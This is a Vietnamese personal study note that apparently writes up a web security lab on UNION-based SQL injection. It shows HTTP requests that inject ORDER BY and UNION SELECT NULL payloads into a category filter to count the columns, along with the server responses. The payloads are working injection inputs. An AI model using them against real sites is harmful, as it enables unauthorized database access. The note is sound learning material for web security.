![[lab-sqli-union-columns.png]]
Lab UNION đếm cột bằng ORDER BY rồi verify bằng UNION NULL.

> [!NOTE] phân tích đề
> - endpoint `/filter?category=...` có UNION được.
> - UNION đòi khớp số cột.
> -sau khi quan sát gói tin filter này, mình thấy chèn `'` thì lỗi SQL mà UNION lại bắt buộc đúng số cột, nên mình dò số cột bằng ORDER BY tăng dần trước.
> - liên quan [[union sql  injection]] và [[xác định số cột&kiểu dl]].

### hướng giải
- [ ] intercept `/filter?category=Gifts`.
- [ ] chèn `' ORDER BY 1--`, `2--`, `3--`...
- [ ] tới số nào lỗi thì trừ 1 ra số cột.
- [ ] verify bằng `' UNION SELECT NULL,...--`.
- [ ] chốt số cột.

### giải
request dò:
```
GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1
GET /filter?category=Gifts' ORDER BY 3-- HTTP/1.1
```
-> 1,2,3 đều 200.
request:
```
GET /filter?category=Gifts' ORDER BY 4-- HTTP/1.1
```
response:
```
The ORDER BY position number 4 is out of range
```
-> lố.
=> có 3 cột.

request verify:
```
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
```
-> 200 không lỗi.
=> chốt 3 cột.
request đối chứng:
```
GET /filter?category=Gifts' UNION SELECT NULL,NULL-- HTTP/1.1
```
-> 500 lỗi số cột.
=> càng chắc.

> [!NOTE] bài học
> - ORDER BY để đếm, UNION NULL để verify.
> - lỗi `out of range` là đáp án.
> - sau bài này qua [[Lab-SQLi UNION retrieve version and users]].
